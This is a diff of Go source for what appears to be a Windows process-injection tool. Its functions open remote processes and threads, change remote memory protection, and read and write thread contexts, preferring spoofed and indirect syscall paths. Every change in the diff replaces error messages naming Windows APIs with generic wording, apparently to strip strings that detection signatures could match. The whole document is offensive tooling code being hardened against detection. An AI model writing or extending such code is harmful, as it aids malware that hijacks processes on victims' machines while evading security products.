@@ -46,7 +46,7 @@ func injectOpenProcess(desiredAccess uint32, pid uint32) (uintptr, error) {
 		var handle uintptr
 		status := SpoofedNtOpenProcess(&handle, desiredAccess, uintptr(pid))
 		if status != 0 {
-			return 0, fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
+			return 0, fmt.Errorf("process open failed: status 0x%X", status)
 		}
 		return handle, nil
 	}
@@ -54,13 +54,13 @@ func injectOpenProcess(desiredAccess uint32, pid uint32) (uintptr, error) {
 		var handle uintptr
 		status := IndirectNtOpenProcess(&handle, desiredAccess, uintptr(pid))
 		if status != 0 {
-			return 0, fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
+			return 0, fmt.Errorf("process open failed: status 0x%X", status)
 		}
 		return handle, nil
 	}
 	h, err := windows.OpenProcess(desiredAccess, false, pid)
 	if err != nil {
-		return 0, fmt.Errorf("OpenProcess failed: %w", err)
+		return 0, fmt.Errorf("process open failed: %w", err)
 	}
 	return uintptr(h), nil
 }
@@ -217,7 +217,7 @@ func injectProtectMemory(hProcess, addr uintptr, size int, protect uint32) (uint
 	ret, _, err := procVirtualProtectX.Call(hProcess, addr, uintptr(size),
 		uintptr(protect), uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
-		return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
+		return 0, fmt.Errorf("memory protection change failed: %w", err)
 	}
 	return oldProtect, nil
 }
@@ -273,13 +273,13 @@ func injectOpenThread(desiredAccess uint32, tid uint32) (uintptr, error) {
 		var handle uintptr
 		status := IndirectNtOpenThread(&handle, desiredAccess, uintptr(tid))
 		if status != 0 {
-			return 0, fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
+			return 0, fmt.Errorf("thread open failed: status 0x%X", status)
 		}
 		return handle, nil
 	}
 	h, _, err := procOpenThread.Call(uintptr(desiredAccess), 0, uintptr(tid))
 	if h == 0 {
-		return 0, fmt.Errorf("OpenThread failed: %w", err)
+		return 0, fmt.Errorf("thread open failed: %w", err)
 	}
 	return h, nil
 }
@@ -329,13 +329,13 @@ func injectGetThreadContext(hThread uintptr, ctx *CONTEXT_AMD64) error {
 	if IndirectSyscallsAvailable() {
 		status := IndirectNtGetContextThread(hThread, uintptr(unsafe.Pointer(ctx)))
 		if status != 0 {
-			return fmt.Errorf("NtGetContextThread failed: NTSTATUS 0x%X", status)
+			return fmt.Errorf("thread context read failed: status 0x%X", status)
 		}
 		return nil
 	}
 	ret, _, err := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(ctx)))
 	if ret == 0 {
-		return fmt.Errorf("GetThreadContext failed: %w", err)
+		return fmt.Errorf("thread context read failed: %w", err)
 	}
 	return nil
 }
@@ -345,13 +345,13 @@ func injectSetThreadContext(hThread uintptr, ctx *CONTEXT_AMD64) error {
 	if IndirectSyscallsAvailable() {
 		status := IndirectNtSetContextThread(hThread, uintptr(unsafe.Pointer(ctx)))
 		if status != 0 {
-			return fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
+			return fmt.Errorf("thread context write failed: status 0x%X", status)
 		}
 		return nil
 	}
 	ret, _, err := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(ctx)))
 	if ret == 0 {
-		return fmt.Errorf("SetThreadContext failed: %w", err)
+		return fmt.Errorf("thread context write failed: %w", err)
 	}
 	return nil
 }
